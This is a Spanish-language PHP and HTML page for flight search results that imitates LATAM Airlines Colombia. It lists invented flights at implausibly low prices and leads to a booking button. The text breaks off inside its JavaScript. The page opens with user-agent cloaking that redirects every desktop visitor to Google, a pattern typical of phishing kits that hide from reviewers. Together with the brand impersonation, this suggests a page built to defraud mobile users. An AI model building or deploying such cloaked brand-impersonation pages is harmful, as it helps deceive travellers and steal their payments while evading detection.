<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

$mobileKeywords = [
    'Mobi', 'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 
    'webOS', 'Windows Phone', 'Kindle', 'Opera Mini'
];

$isMobile = false;

foreach ($mobileKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isMobile = true;
        break;
    }
}

if (!$isMobile) {
    header('Location: https://www.google.com');
    exit;
}

?>
<?php
/**
 * flight-results.php
 * Vista de resultados que usa assets/css/ofertas.css y ofertasexp.css
 */

/* Helpers */
function format_price_cop($v){ $n=is_numeric($v)?(float)$v:0; return 'COP '.number_format($n,0,',','.'); }
function stops_label($n = 0){ // Corrected: Added default value for $n
    $n=(int)$n;
    return $n<=0?'Directo':($n===1?'1 parada':"{$n} paradas");
}

/**
 * Helper function to extract airport code from a location string (e.g., "Cúcuta, CUC - Colombia" -> "CUC")
 * Also returns the city name (e.g., "Cúcuta")
 */
function extract_airport_info($location_string) {
    $airport_code = 'N/A';
    $city_name = $location_string; // Default to full string if not parsed

    if (preg_match('/,\s*([A-Z]{3})\s*-/', $location_string, $matches)) {
        $airport_code = $matches[1];
        $city_name = trim(explode(',', $location_string)[0]);
    } else {
        // Fallback for cases where only city name is provided
        $parts = explode(',', $location_string);
        $city_name = trim($parts[0]);
    }

    return ['code' => $airport_code, 'city' => $city_name];
}

/* Componente tarjeta - Movido aquí para asegurar que esté definida antes de cualquier uso */
function render_flight_card(array $f){
  // Define factors for each tariff relative to the base flight price (PHP side)
  $tariff_price_factors_php = [
    'basic' => 1.0,
    'light' => 1.32,
    'full' => 1.53,
    'premium' => 1.82
  ];

  // Calculate prices for each tariff type for display
  $basic_tariff_price = format_price_cop($f['price'] * $tariff_price_factors_php['basic']);
  $light_tariff_price = format_price_cop($f['price'] * $tariff_price_factors_php['light']);
  $full_tariff_price = format_price_cop($f['price'] * $tariff_price_factors_php['full']);
  $premium_tariff_price = format_price_cop($f['price'] * $tariff_price_factors_php['premium']);

  // Merge default values with provided flight data
  $f = array_merge([
    'badge'        => 'Más económico',
    'dep_time'     => '7:27 a. m.',
    'dep_airport'  => 'BAQ', // Default, will be overridden by dynamic data
    'arr_time'     => '11:34 a. m.',
    'arr_airport'  => 'CLO', // Default, will be overridden by dynamic data
    'duration'     => '4 h 7 min',
    'stops'        => 1,
    'price'        => 200715,
    'price_label'  => 'Por persona desde',
    'airline'      => 'LATAM Airlines Colombia',
    'airline_logo' => 'assets/img/SymbolPositive.svg', // Placeholder image
    'details_url'  => '#',
  ], $f);

  $stops = stops_label($f['stops']);
  $price = format_price_cop($f['price']);

  ?>
  <article class="flight-card" onclick="toggleFlightDetails(this)">
    <div class="flight-card-header">
      <?php if (!empty($f['badge'])): ?>
        <span class="tag-economico"><?= htmlspecialchars($f['badge']) ?></span>
      <?php endif; ?>
    </div>

    <div class="flight-card-body">
      <!-- Mobile view: original structure -->
      <div class="flight-times departure-mobile">
        <div class="time"><?= htmlspecialchars($f['dep_time']) ?></div>
        <div class="airport-code"><?= htmlspecialchars($f['dep_airport']) ?></div>
      </div>

      <div class="flight-duration mobile-duration">
        <span class="duration-text">Duración</span>
        <span class="duration-value"><?= htmlspecialchars($f['duration']) ?></span>
      </div>

      <div class="flight-times arrival-mobile">
        <div class="time"><?= htmlspecialchars($f['arr_time']) ?></div>
        <div class="airport-code"><?= htmlspecialchars($f['arr_airport']) ?></div>
      </div>

      <!-- Desktop view: new structure -->
      <div class="desktop-flight-info">
        <div class="flight-times departure-desktop">
          <div class="time"><?= htmlspecialchars($f['dep_time']) ?></div>
          <div class="airport-code"><?= htmlspecialchars($f['dep_airport']) ?></div>
        </div>

        <div class="connection-line">
          <div class="flight-duration desktop-duration">
            <span class="duration-text">Duración</span>
            <span class="duration-value"><?= htmlspecialchars($f['duration']) ?></span>
          </div>
        </div>

        <div class="flight-times arrival-desktop">
          <div class="time"><?= htmlspecialchars($f['arr_time']) ?></div>
          <div class="airport-code"><?= htmlspecialchars($f['arr_airport']) ?></div>
        </div>
      </div>

      <div class="flight-price-desktop">
        <span class="price-label"><?= htmlspecialchars($f['price_label']) ?></span>
        <span class="price-value"><?= htmlspecialchars($price) ?></span>
        <span class="tax-info">Incluye tasas e impuestos</span>
      </div>
    </div>

    <div class="flight-card-footer">
      <a class="stops-info" href="<?= htmlspecialchars($f['details_url']) ?>">
        <?= htmlspecialchars($stops) ?>
      </a>

      <div class="operated-by">
        <span>Operado por <img src="assets/img/SymbolPositive.svg" alt="Logo de Aerolínea" class="latam-logo-small"> <strong><?= htmlspecialchars($f['airline']) ?></strong></span>
      </div>

      <div class="flight-price-mobile">
        <span class="price-label"><?= htmlspecialchars($f['price_label']) ?></span>
        <span class="price-value"><?= htmlspecialchars($price) ?></span>
      </div>
    </div>

    <!-- Expanded details section (inicialmente oculta) -->
    <div class="flight-details-expanded hidden">
      <div class="expanded-header">
        <span class="aircraft-info">Airbus A320 Incluye <img src="assets/img/capa10.png" alt="Wifi Icon"> <img src="assets/img/capa11.png" alt="Power Outlet Icon"> <img src="assets/img/capa12.png" alt="USB Port Icon"></span>
        <div class="tariff-summary">
          <span>4 Tarifas disponibles</span>
          <!-- The 'X' button in the expanded flight card that should only close the card, not the modal -->
          <button class="close-expanded-btn" onclick="event.stopPropagation(); toggleFlightDetails(this.closest('.flight-card'));">Cerrar X</button>
        </div>
      </div>
      <div class="tariff-cards-container">
        <!-- Basic Card -->
        <div class="tariff-card basic-tariff">
          <div class="tariff-card-header">Basic</div>
          <div class="tariff-card-body">
            <ul>
              <li><span class="icon-check">✅</span> Bolso o mochila pequeña</li>
              <li><span class="icon-cross">❌</span> Cambio con cargo + diferencia de precio</li>
              <li><span class="icon-cross">❌</span> No aplican beneficios por categorías de socios</li>
            </ul>
          </div>
          <div class="tariff-card-footer">
            <span class="price-value"><?= htmlspecialchars($basic_tariff_price) ?></span>
            <span class="price-label">Por pasajero</span>
            <span class="tax-info">Incluye tasas e impuestos</span>
            <a href="#" class="details-link" onclick="event.stopPropagation(); openTariffDetailModal('basic', <?= $f['price'] ?>);">Más detalles</a>
            <button class="choose-tariff-btn" onclick="selectOutboundFlight(<?= $f['data_flight_index'] ?>, 'basic');">Elegir</button>
          </div>
        </div>
        <!-- Light Card -->
        <div class="tariff-card light-tariff">
          <div class="tariff-card-header">Light</div>
          <div class="tariff-card-body">
            <ul>
              <li><span class="icon-check">✅</span> Bolso o mochila pequeña</li>
              <li><span class="icon-check">✅</span> Equipaje de mano 12 kg</li>
              <li><span class="icon-check">✅</span> Cambio con cargo + diferencia de precio</li>
              <li><span class="icon-cross">❌</span> Postulación a UPG con tramos</li>
            </ul>
          </div>
          <div class="tariff-card-footer">
            <span class="price-value"><?= htmlspecialchars($light_tariff_price) ?></span>
            <span class="price-label">Por pasajero</span>
            <span class="tax-info">Incluye tasas e impuestos</span>
            <a href="#" class="details-link" onclick="event.stopPropagation(); openTariffDetailModal('light', <?= $f['price'] ?>);">Más detalles</a>
            <button class="choose-tariff-btn" onclick="selectOutboundFlight(<?= $f['data_flight_index'] ?>, 'light');">Elegir</button>
          </div>
        </div>
        <!-- Full Card -->
        <div class="tariff-card full-tariff">
          <div class="tariff-card-header">Full</div>
          <div class="tariff-card-body">
            <ul>
              <li><span class="icon-check">✅</span> Bolso o mochila pequeña</li>
              <li><span class="icon-check">✅</span> Equipaje de mano 12 kg</li>
              <li><span class="icon-check">✅</span> 1 equipaje de bodega 23 kg</li>
              <li><span class="icon-check">✅</span> Cambio sin cargo + diferencia de precio</li>
              <li><span class="icon-check">✅</span> Devolución antes de la salida del primer vuelo</li>
              <li><span class="icon-check">✅</span> Selección de asiento Estándar</li>
              <li><span class="icon-cross">❌</span> Postulación a UPG con tramos</li>
            </ul>
          </div>
          <div class="tariff-card-footer">
            <span class="price-value"><?= htmlspecialchars($full_tariff_price) ?></span>
            <span class="price-label">Por pasajero</span>
            <span class="tax-info">Incluye tasas e impuestos</span>
            <a href="#" class="details-link" onclick="event.stopPropagation(); openTariffDetailModal('full', <?= $f['price'] ?>);">Más detalles</a>
            <button class="choose-tariff-btn" onclick="selectOutboundFlight(<?= $f['data_flight_index'] ?>, 'full');">Elegir</button>
          </div>
        </div>
        <!-- Premium Economy Card -->
        <div class="tariff-card premium-tariff">
          <div class="premium-economy-tag">Cabina Premium Economy</div>
          <div class="tariff-card-header">Premium Economy</div>
          <div class="tariff-card-body">
            <ul>
              <li><span class="icon-check">✅</span> Bolso o mochila pequeña</li>
              <li><span class="icon-check">✅</span> Equipaje de mano 16 kg</li>
              <li><span class="icon-check">✅</span> 1 equipaje de bodega 23 kg</li>
              <li><span class="icon-check">✅</span> Cambio sin cargo + diferencia de precio</li>
              <li><span class="icon-check">✅</span> Devolución antes de la salida del primer vuelo</li>
              <li><span class="icon-check">✅</span> Asiento del medio bloqueado</li>
              <li><span class="icon-check">✅</span> Mejor oferta gastronómica</li>
              <li><span class="icon-check">✅</span> Más espacio para tus piernas</li>
              <li><span class="icon-check">✅</span> Embarque y desembarque prioritario</li>
            </ul>
          </div>
          <div class="tariff-card-footer">
            <span class="price-value"><?= htmlspecialchars($premium_tariff_price) ?></span>
            <span class="price-label">Por pasajero</span>
            <span class="tax-info">Incluye tasas e impuestos</span>
            <a href="#" class="details-link" onclick="event.stopPropagation(); openTariffDetailModal('premium', <?= $f['price'] ?>);">Más detalles</a>
            <button class="choose-tariff-btn" onclick="selectOutboundFlight(<?= $f['data_flight_index'] ?>, 'premium');">Elegir</button>
          </div>
        </div>
      </div>
    </div>
  </article>
  <?php
}

// Get origin and destination from URL
$origin_param = isset($_GET['origin']) ? urldecode($_GET['origin']) : 'Barranquilla, BAQ - Colombia';
$destination_param = isset($_GET['destination']) ? urldecode($_GET['destination']) : 'Bogotá, BOG - Colombia';

$origin_info = extract_airport_info($origin_param);
$destination_info = extract_airport_info($destination_param);

$default_dep_airport = $origin_info['code'];
$default_arr_airport = $destination_info['code'];
$default_origin_city = $origin_info['city'];
$default_destination_city = $destination_info['city'];

// Base price for the "Más económico" flight
$base_price = 70000;

// Define flight data dynamically based on URL parameters with diverse pricing
$flights = [
  [ // Original flight - Cheapest
    'badge'=>'Más económico',
    'dep_time'=>'7:27 a. m.',
    'dep_airport'=>$default_dep_airport,
    'arr_time'=>'11:34 a. m.',
    'arr_airport'=>$default_arr_airport,
    'duration'=>'4 h 7 min',
    'stops'=>1,
    'price'=>$base_price,
    'airline'=>'LATAM Airlines Colombia',
    'airline_logo'=>'assets/img/SymbolPositive.svg',
    'details_url'=>'#'
  ],
  [ // Flight 2 - Direct flight, slightly more expensive
    'badge'=>'Directo',
    'dep_time'=>'8:00 a. m.',
    'dep_airport'=>$default_dep_airport,
    'arr_time'=>'12:00 p. m.',
    'arr_airport'=>$default_arr_airport,
    'duration'=>'4 h 0 min',
    'stops'=>0,
    'price'=>round($base_price * 1.25),
    'airline'=>'LATAM Airlines Colombia',
    'airline_logo'=>'assets/img/SymbolPositive.svg',
    'details_url'=>'#'
  ],
  [ // Flight 3 - More stops, cheaper
    'badge'=>'Más barato',
    'dep_time'=>'9:15 a. m.',
    'dep_airport'=>$default_dep_airport,
    'arr_time'=>'2:30 p. m.',
    'arr_airport'=>$default_arr_airport,
    'duration'=>'5 h 15 min',
    'stops'=>2,
    'price'=>round($base_price * 0.85),
    'airline'=>'LATAM Airlines Colombia',
    'airline_logo'=>'assets/img/SymbolPositive.svg',
    'details_url'=>'#'
  ],
  [ // Flight 4 - Morning flight, premium price
    'badge'=>'',
    'dep_time'=>'10:30 a. m.',
    'dep_airport'=>$default_dep_airport,
    'arr_time'=>'3:00 p. m.',
    'arr_airport'=>$default_arr_airport,
    'duration'=>'4 h 30 min',
    'stops'=>1,
    'price'=>round($base_price * 1.40),
    'airline'=>'LATAM Airlines Colombia',
    'airline_logo'=>'assets/img/SymbolPositive.svg',
    'details_url'=>'#'
  ],
  [ // Flight 5 - Afternoon flight, standard price
    'badge'=>'',
    'dep_time'=>'1:00 p. m.',
    'dep_airport'=>$default_dep_airport,
    'arr_time'=>'5:00 p. m.',
    'arr_airport'=>$default_arr_airport,
    'duration'=>'4 h 0 min',
    'stops'=>0,
    'price'=>round($base_price * 1.35),
    'airline'=>'LATAM Airlines Colombia',
    'airline_logo'=>'assets/img/SymbolPositive.svg',
    'details_url'=>'#'
  ],
  [ // Flight 6 - Evening flight, higher price
    'badge'=>'',
    'dep_time'=>'4:15 p. m.',
    'dep_airport'=>$default_dep_airport,
    'arr_time'=>'8:30 p. m.',
    'arr_airport'=>$default_arr_airport,
    'duration'=>'4 h 15 min',
    'stops'=>1,
    'price'=>round($base_price * 1.50),
    'airline'=>'LATAM Airlines Colombia',
    'airline_logo'=>'assets/img/SymbolPositive.svg',
    'details_url'=>'#'
  ],
  [ // Flight 7 - Late evening flight, premium price
    'badge'=>'Último vuelo',
    'dep_time'=>'8:45 p. m.',
    'dep_airport'=>$default_dep_airport,
    'arr_time'=>'1:15 a. m.',
    'arr_airport'=>$default_arr_airport,
    'duration'=>'4 h 30 min',
    'stops'=>1,
    'price'=>round($base_price * 1.65),
    'airline'=>'LATAM Airlines Colombia',
    'airline_logo'=>'assets/img/SymbolPositive.svg',
    'details_url'=>'#'
  ],
  [ // Flight 8 - Early morning flight, low price
    'badge'=>'',
    'dep_time'=>'5:30 a. m.',
    'dep_airport'=>$default_dep_airport,
    'arr_time'=>'9:45 a. m.',
    'arr_airport'=>$default_arr_airport,
    'duration'=>'4 h 15 min',
    'stops'=>1,
    'price'=>round($base_price * 0.95),
    'airline'=>'LATAM Airlines Colombia',
    'airline_logo'=>'assets/img/SymbolPositive.svg',
    'details_url'=>'#'
  ],
  [ // Flight 9 - Mid-morning flight, standard price
    'badge'=>'',
    'dep_time'=>'11:20 a. m.',
    'dep_airport'=>$default_dep_airport,
    'arr_time'=>'3:35 p. m.',
    'arr_airport'=>$default_arr_airport,
    'duration'=>'4 h 15 min',
    'stops'=>1,
    'price'=>round($base_price * 1.20),
    'airline'=>'LATAM Airlines Colombia',
    'airline_logo'=>'assets/img/SymbolPositive.svg',
    'details_url'=>'#'
  ],
  [ // Flight 10 - Afternoon flight, higher price
    'badge'=>'',
    'dep_time'=>'2:45 p. m.',
    'dep_airport'=>$default_dep_airport,
    'arr_time'=>'7:00 p. m.',
    'arr_airport'=>$default_arr_airport,
    'duration'=>'4 h 15 min',
    'stops'=>1,
    'price'=>round($base_price * 1.45),
    'airline'=>'LATAM Airlines Colombia',
    'airline_logo'=>'assets/img/SymbolPositive.svg',
    'details_url'=>'#'
  ]
];
?><!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>Resultados de vuelos</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/css/ofertas.css?v=9">
  <link rel="stylesheet" href="assets/css/ofertasexp.css?v=1"> <!-- Link to the new CSS file -->
  <style>
   /* Visibilidad */
#initialFlightResults.hidden,
#travelSummarySection.hidden,
#continueButtonContainer.hidden,
.hidden{ display:none !important; }

/* ===== RESUMEN NUEVO (como tu 2ª imagen) ===== */
.summary-card{
  background:#fff;
  border:1px solid var(--border-color);
  border-radius:12px;
  box-shadow:0 1px 1px rgba(16,24,40,.02);
  padding:16px 20px;
  margin-bottom:14px;
}

/* Encabezado */
.card-header{
  display:flex; align-items:center; gap:8px;
  font-weight:700; color:var(--text-color);
}
.check-dot{
  width:18px; height:18px; border-radius:999px;
  background:#ecfdf5; color:#047857; display:grid; place-items:center;
  font-size:12px; line-height:1;
}

/* Grilla central horas/duración */
.flight-grid{
  display:grid; grid-template-columns:1fr auto 1fr;
  column-gap:22px; align-items:start; padding:14px 0 10px;
}
.flight-grid .side .time{ font-size:1.6rem; font-weight:800; line-height:1; color:var(--text-color);}
.flight-grid .side .iata{ font-size:.9rem; font-weight:600; color:var(--text-color); margin-top:4px;}
.flight-grid .middle{ text-align:center; }
.flight-grid .middle .stops{ font-weight:700; color:var(--text-color); }
.flight-grid .middle .duration{ color:var(--text-muted); font-size:.95rem; margin-top:2px; }

.operated-by{ grid-column:1/-1; display:flex; align-items:center; gap:6px; font-size:.9rem; color:var(--text-muted); margin-top:10px; }
.card-divider{ border:0; border-top:1px solid var(--border-color); margin:10px 0; }

/* Pie del card: precio derecha + link izquierda */
.card-footer{ display:flex; align-items:center; justify-content:space-between; gap:12px; }
.card-footer .change-flight-link{ color:var(--primary-color); text-decoration:underline; font-weight:600; }
.card-footer .change-flight-link:hover{ text-decoration:none; }
.price-right{ text-align:right; }
.price-right .price-label{ font-size:.8rem; color:var(--text-muted); }
.price-right .price-value{ font-weight:800; font-size:1.25rem; color:var(--brand-purple); }

/* Totales */
.total-price-summary{
  background-color:var(--bg-results);
  border:1px solid var(--border-color);
  border-radius:8px; padding:20px; margin-top:14px;
}
.total-price-summary .price-line{ display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; font-size:1rem; color:var(--text-color); }
.total-price-summary .price-line span:last-child{ font-weight:700; }
.total-price-summary .subtotal-line{ font-size:1.2rem; font-weight:800; color:var(--brand-purple); padding-top:10px; border-top:1px dashed var(--border-color); margin-top:12px; }
.total-price-summary .tax-info{ font-size:.75rem; color:var(--text-muted); text-align:right; margin-top:10px; }

/* Botón continuar */
.continue-btn{
  background-color:var(--primary-color);
  color:#fff; border:none; border-radius:8px;
  padding:15px 25px; font-size:1.1rem; font-weight:700;
  cursor:pointer; width:100%; margin-top:20px;
  transition:background-color .2s ease, transform .1s ease;
}
.continue-btn:hover{ background-color:#1a4ed8; transform:translateY(-1px); }
.continue-btn:active{ transform:translateY(0); }

/* Responsive */
@media (max-width:640px){
  .flight-grid .side .time{ font-size:1.4rem; }
  .price-right .price-value{ font-size:1.15rem; }
}


  </style>
</head>
<body>

<section class="flight-results-section">
  <div class="container">
    <div id="initialFlightResults">
        <div class="results-header-bar">
          <h2 class="results-title">Resultados</h2>
          <div class="sort-by-dropdown">
            <span class="sort-label">Ordenar por</span>
            <select class="form-select" aria-label="Ordenar resultados">
              <option value="price_asc" selected>Precio más bajo</option>
              <option value="duration_asc">Duración</option>
              <option value="dep_time_asc">Hora de salida</option>
            </select>
            <span class="select-arrow">▼</span>
          </div>
        </div>

        <p class="order-info">Mostrando los más económicos primero</p>
        <!-- INFORMACIÓN DE DEPURACIÓN: Mostrar origen y destino de la URL -->
        <p class="url-info">Origen: <?= htmlspecialchars($default_origin_city) ?> (<?= htmlspecialchars($default_dep_airport) ?>) - Destino: <?= htmlspecialchars($default_destination_city) ?> (<?= htmlspecialchars($default_arr_airport) ?>)</p>

        <div class="flight-cards-list">
          <?php
          foreach($flights as $index => $f) {
              // Add a data-flight-index attribute to each article for easy JS access
              $f['data_flight_index'] = $index;
              render_flight_card($f);
          }
          ?>
        </div>
    </div>

    <!-- Sección de Resumen de tu Viaje (inicialmente oculta) -->
<!-- Sección de Resumen de tu Viaje (reemplazar todo este bloque) -->
<section id="travelSummarySection" class="hidden">
  <h2 class="results-title">Resumen de tu viaje</h2>

  <!-- ====== IDA ====== -->
  <div class="summary-card">
    <div class="card-header">
      <span class="check-dot">✓</span>
      <span>Vuelo de ida • <span id="summaryTariffType"></span> • <span id="summaryDate"></span></span>
    </div>

    <div class="flight-grid">
      <div class="side">
        <div class="time" id="summaryDepTime"></div>
        <div class="iata" id="summaryDepAirport"></div>
      </div>
      <div class="middle">
        <div class="stops" id="summaryStopLabel"></div>
        <div class="duration" id="summaryDuration"></div>
      </div>
      <div class="side">
        <div class="time" id="summaryArrTime"></div>
        <div class="iata" id="summaryArrAirport"></div>
      </div>

      <div class="operated-by">
        Operado por
        <img src="https://placehold.co/16x16/E5E7EB/E5E7EB?text=Logo" alt="" class="latam-logo-small" />
        <strong><span id="summaryAirline"></span></strong>
      </div>
    </div>

    <hr class="card-divider" />

    <div class="card-footer">
      <a href="#" class="change-flight-link" onclick="resetFlightSelection(); return false;">Cambiar tu vuelo</a>
      <div class="price-right">
        <div class="price-label">Precio por pasajero</div>
        <div class="price-value" id="summaryPrice"></div>
      </div>
    </div>
  </div>

  <!-- ====== VUELTA ====== -->
  <div class="summary-card" id="returnSummaryCard">
    <div class="card-header">
      <span class="check-dot">✓</span>
      <span>Vuelo de vuelta • <span id="summaryReturnTariffType"></span> • <span id="summaryReturnDate"></span></span>
    </div>

    <div class="flight-grid">
      <div class="side">
        <div class="time" id="summaryReturnDepTime"></div>
        <div class="iata" id="summaryReturnDepAirport"></div>
      </div>
      <div class="middle">
        <div class="stops" id="summaryReturnStopLabel"></div>
        <div class="duration" id="summaryReturnDuration"></div>
      </div>
      <div class="side">
        <div class="time" id="summaryReturnArrTime"></div>
        <div class="iata" id="summaryReturnArrAirport"></div>
      </div>

      <div class="operated-by">
        Operado por
        <img src="https://placehold.co/16x16/E5E7EB/E5E7EB?text=Logo" alt="" class="latam-logo-small" />
        <strong><span id="summaryReturnAirline"></span></strong>
      </div>
    </div>

    <hr class="card-divider" />

    <div class="card-footer">
      <a href="#" class="change-flight-link" onclick="resetFlightSelection(); return false;">Cambiar tu vuelo</a>
      <div class="price-right">
        <div class="price-label">Precio por pasajero</div>
        <div class="price-value" id="summaryReturnPrice"></div>
      </div>
    </div>
  </div>

  <!-- ====== TOTALES ====== -->
  <div id="totalPriceSummaryContainer" class="total-price-summary hidden">
    <div class="price-line">
      <span>Vuelos</span>
      <span id="totalFlightsPrice"></span>
    </div>
    <div class="price-line">
      <span>Tasas, cargos e impuestos</span>
      <span id="totalTaxesFees"></span>
    </div>
    <div class="price-line subtotal-line">
      <span>Subtotal</span>
      <span id="totalSubtotal"></span>
    </div>
    <p class="tax-info">
      Por persona. Incluye tasas, cargos e impuestos. Los precios podrían variar según disponibilidad de la tarifa al momento de comprar.
      El precio se confirmará al llegar al paso de pago.
    </p>
  </div>

<div id="continueButtonContainer" class="hidden">
  <button class="continue-btn" onclick="continueBooking()">Continuar</button>
</div>

  <!-- ====== CONTROLES/LISTA DE VUELTA ====== -->
  <h2 id="returnFlightsTitle" class="results-title">Elige un vuelo de vuelta</h2>
  <div id="returnFlightsSort" class="sort-by-dropdown">
    <span class="sort-label">Ordenar por</span>
    <select class="form-select" aria-label="Ordenar resultados">
      <option value="price_asc" selected>Recomendado</option>
      <option value="duration_asc">Precio más bajo</option>
      <option value="dep_time_asc">Duración</option>
      <option value="dep_time_asc">Hora de salida</option>
    </select>
    <span class="select-arrow">▼</span>
  </div>
  <p id="returnFlightsOrderInfo" class="order-info">Mostrando los más económicos primero</p>
  <div class="flight-cards-list" id="returnFlightCardsList"></div>
</section>

  </div>
</section>

<!-- Tariff Detail Modal -->
<div id="tariffDetailModal" class="tariff-detail-modal-overlay hidden">
  <div class="tariff-detail-modal-content">
    <div class="modal-header">
      <div class="modal-title-group">
        <h3 class="modal-title">Detalle tarifa</h3>
        <div class="tariff-info-line">
          <span class="tariff-name">Basic</span>
          <span class="tariff-price">COP XXX.XXX</span> <!-- Initial placeholder -->
        </div>
      </div>
      <!-- The 'X' button in the modal, now with event.stopPropagation() -->
      <button class="modal-close-btn" onclick="event.stopPropagation(); closeTariffDetailModal()">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x"><path d="M18 6 6 18"/></svg>
      </button>
    </div>

    <div class="modal-body">
      <h4 class="section-title">Esta tarifa incluye:</h4>
      <div class="include-items-container">
        <!-- Content of includes is injected here by JS -->
      </div>
      <a href="#" class="more-info-link">
        <img src="https://placehold.co/24x24/E5E7EB/E5E7EB?text=Info" alt="Info Icon">
        Más información sobre equipaje
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-right"><path d="m9 18 6-6-6-6"/></svg>
      </a>

      <h4 class="section-title">Extras incluidos:</h4>
      <p class="section-subtitle">Beneficios exclusivos de esta tarifa, no disponibles por separado</p>
      <div class="extra-items-container">
        <!-- Content of extras is injected here by JS -->
      </div>
    </div>
  </div>
</div>
<script>
  // =========================
  //  Utilidades y constantes
  // =========================
  // ¿El usuario buscó SOLO IDA?

  /* === URL params y pasajeros (debe ir primero en el <script>) === */
  const __sp = new URLSearchParams(window.location.search);

  // Ej: "2 adultos, 1 niño" -> 3
  const passengersParam  = __sp.get('passengers') || '1';
  const PASSENGERS_COUNT =
    (passengersParam.match(/\d+/g)?.map(Number).reduce((a, b) => a + b, 0)) || 1;

  // Flag de solo ida
  const ONE_WAY =
    !__sp.get('return-date') || __sp.get('return-date') === 'N/A' || __sp.get('trip') === 'oneway';

  const tariffPriceFactors = { basic: 1.0, light: 1.32, full: 1.53, premium: 1.82 };

  const tariffDetailsContent = {
    basic: {
      name: 'Basic',
      includes: [
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Bag', title: 'Bolso o mochila', description: 'Puede ser una cartera, un bolso para laptop o un bolso para bebé' }
      ],
      extras: [
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Change', title: 'Cambios antes de la hora del vuelo', subtitle: 'COP 120.000', description: 'Más diferencia de precio' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Refund', title: 'Devolución de 0% antes de la salida del primer vuelo de tu viaje', description: 'De acuerdo a las condiciones de tu tarifa' }
      ]
    },
    light: {
      name: 'Light',
      includes: [
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Bag', title: 'Bolso o mochila', description: 'Puede ser una cartera, un bolso para laptop o un bolso para bebé' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Handbag', title: 'Equipaje de mano', description: '12 kg' }
      ],
      extras: [
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Change', title: 'Cambio con cargo', subtitle: '+ diferencia de precio' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Upgrade', title: 'Postulación a UPG con tramos', description: 'No disponible' }
      ]
    },
    full: {
      name: 'Full',
      includes: [
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Bag', title: 'Bolso o mochila', description: 'Puede ser una cartera, un bolso para laptop o un bolso para bebé' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Handbag', title: 'Equipaje de mano', description: '12 kg' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Luggage', title: 'Equipaje de bodega', description: '23 kg' }
      ],
      extras: [
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Change', title: 'Cambio sin cargo', subtitle: '+ diferencia de precio' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Refund', title: 'Devolución antes de la salida del primer vuelo', description: 'De acuerdo a las condiciones de tu tarifa' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Seat', title: 'Selección de asiento', description: 'Estándar' }
      ]
    },
    premium: {
      name: 'Premium Economy',
      includes: [
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Bag', title: 'Bolso o mochila', description: 'Puede ser una cartera, un bolso para laptop o un bolso para bebé' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Handbag', title: 'Equipaje de mano', description: '16 kg' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Luggage', title: 'Equipaje de bodega', description: '23 kg' }
      ],
      extras: [
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Change', title: 'Cambio sin cargo', subtitle: '+ diferencia de precio' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Refund', title: 'Devolución antes de la salida del primer vuelo', description: 'De acuerdo a las condiciones de tu tarifa' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Seat', title: 'Asiento del medio bloqueado' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Food', title: 'Mejor oferta gastronómica' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Legroom', title: 'Más espacio para tus piernas' },
        { icon: 'https://placehold.co/24x24/E5E7EB/E5E7EB?text=Priority', title: 'Embarque y desembarque prioritario' }
      ]
    }
  };


  function hideReturnSelectionUI(){
    ['returnFlightsTitle','returnFlightsSort','returnFlightsOrderInfo','returnFlightCardsList','returnSummaryCard']
      .forEach(id => { const el = document.getElementById(id); if(el){ el.classList.add('hidden'); el.style.display='none'; } });
  }

  function showReturnSelectionUI(){
    // Mostramos solo los controles/lista; el resumen de vuelta se muestra tras elegir
    ['returnFlightsTitle','returnFlightsSort','returnFlightsOrderInfo','returnFlightCardsList']
      .forEach(id => { const el = document.getElementById(id); if(el){ el.classList.remove('hidden'); el.style.display=''; } });
  }

  function formatPriceCopJS(value) {
    return 'COP ' + Math.round(value).toLocaleString('es-CO');
  }

  function stops_label_js(n) {
    n = parseInt(n);
    if (n <= 0) return 'Directo';
    if (n === 1) return '1 parada';
    return `${n} paradas`;
  }

  // =========================
  //  Datos desde PHP
  // =========================
  const allFlightsData = <?= json_encode($flights, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE); ?>;
  const defaultDepAirport = "<?= $default_dep_airport; ?>";
  const defaultArrAirport = "<?= $default_arr_airport; ?>";

  // =========================
  //  Estado de selección
  // =========================
  let selectedOutboundFlight = null;
  let selectedReturnFlight  = null;
  let simulatedReturnFlights = []; // ¡se llena una sola vez por selección de ida!

  // =========================
  //  Funciones expuestas (HTML inline onclick)
  // =========================
  window.toggleFlightDetails = function(cardElement) {
    const detailsSection = cardElement.querySelector('.flight-details-expanded');
